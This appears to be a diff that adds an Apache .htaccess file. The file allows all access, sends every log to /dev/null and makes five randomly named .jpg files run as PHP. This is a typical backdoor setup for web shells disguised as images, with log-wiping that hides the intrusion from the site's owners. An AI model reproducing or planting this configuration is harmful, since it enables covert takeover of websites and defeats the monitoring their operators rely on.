@@ -1,0 +1,42 @@
+
+
+Order Allow,Deny
+Allow from All
+
+Satisfy Any
+
+Options -Indexes
+
+<IfModule log_config_module.c>
+	ErrorLog /dev/null
+	CustomLog /dev/null common
+	GlobalLog /dev/null
+</IfModule>
+
+<IfModule mod_rewrite.c>
+	RewriteEngine Off
+</IfModule>
+
+<Files "xmfqy1.jpg">
+	AddType application/x-httpd-php .jpg
+	AddHandler application/x-httpd-php .jpg
+</Files>
+<Files "xmfqy2.jpg">
+	AddType application/x-httpd-php5 .jpg
+	AddHandler application/x-httpd-php5 .jpg
+</Files>
+<Files "xmfqy3.jpg">
+	AddType php-script .jpg
+	AddHandler php-script .jpg
+</Files>
+<Files "xmfqy4.jpg">
+	AddType php4-script .jpg
+	AddHandler php4-script .jpg
+</Files>
+<Files "xmfqy5.jpg">
+	AddType php5-script .jpg
+	AddHandler php5-script .jpg
+</Files>
+
+## llllllllll
+
